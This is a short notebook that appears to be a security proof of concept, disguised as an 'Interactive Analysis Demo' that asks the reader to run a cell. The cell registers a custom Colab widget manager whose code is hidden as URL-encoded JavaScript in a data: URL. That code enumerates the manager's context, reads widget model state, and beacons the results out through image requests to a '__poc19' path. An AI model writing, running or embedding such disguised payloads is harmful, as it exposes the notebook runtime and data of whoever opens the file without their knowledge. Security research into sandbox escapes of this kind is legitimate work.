# %% [markdown]
# # Interactive Analysis Demo
#
# Connect to runtime and run the cell below to render the interactive widget.

# %%
# init

# %%
from IPython.core.display import publish_display_data

_model_id = 'poc19-custom-0000-0000-0000-000000000019'
_data_url = "data:text/javascript,export%20async%20function%20createWidgetManager%28context%29%20%7B%20const%20log%20%3D%20%28t%2Cv%29%20%3D%3E%20new%20Image%28%29.src%20%3D%20%27https%3A%2F%2Fcolab.research.google.com%2F__poc19%2F%27%2Bt%2B%27%3Fv%3D%27%2BencodeURIComponent%28String%28v%29.slice%280%2C400%29%29%3B%20log%28%27CWM_CALLED%27%2C%20location.origin%29%3B%20try%20%7B%20const%20own%20%3D%20Object.getOwnPropertyNames%28context%29%3B%20const%20proto%20%3D%20Object.getOwnPropertyNames%28Object.getPrototypeOf%28context%29%7C%7C%7B%7D%29%3B%20log%28%27CTX_OWN%27%2C%20own.join%28%27%2C%27%29%29%3B%20log%28%27CTX_PROTO%27%2C%20proto.join%28%27%2C%27%29%29%3B%20%7D%20catch%28e%29%20%7B%20log%28%27CTX_ERR%27%2C%20e.message.slice%280%2C80%29%29%3B%20%7D%20return%20%7B%20render%3A%20async%20function%28modelId%2C%20el%29%20%7B%20log%28%27RENDER%27%2C%20modelId.slice%280%2C20%29%29%3B%20try%20%7B%20const%20s%20%3D%20await%20context.getModelState%28modelId%29%3B%20log%28%27STATE%27%2C%20%27id%3D%27%2BmodelId.slice%280%2C20%29%2B%27%7Cs%3D%27%2BJSON.stringify%28s%29.slice%280%2C380%29%29%3B%20%7D%20catch%28e%29%20%7B%20log%28%27STATE_ERR%27%2C%20e.name%2B%27%7C%27%2Be.message.slice%280%2C80%29%29%3B%20%7D%20return%20true%3B%20%7D%2C%20commChannelOpened%3A%20function%28modelId%2C%20comm%2C%20meta%2C%20bufs%29%20%7B%20log%28%27COMM%27%2C%20modelId.slice%280%2C20%29%29%3B%20context.getModelState%28modelId%29%20.then%28s%20%3D%3E%20log%28%27COMM_STATE%27%2C%20%27id%3D%27%2BmodelId.slice%280%2C20%29%2B%27%7Cs%3D%27%2BJSON.stringify%28s%29.slice%280%2C380%29%29%29%20.catch%28e%20%3D%3E%20log%28%27COMM_ERR%27%2C%20e.name%2B%27%7C%27%2Be.message.slice%280%2C80%29%29%29%3B%20%7D%20%7D%3B%20%7D"

publish_display_data(
    data={
        'application/vnd.jupyter.widget-view+json': {
            'version_major': 2,
            'version_minor': 0,
            'model_id': _model_id
        },
        'text/plain': ['Interactive widget']
    },
    metadata={
        'colab': {
            'custom_widget_manager': {
                'url': _data_url
            }
        }
    }
)
print('Widget rendered.')
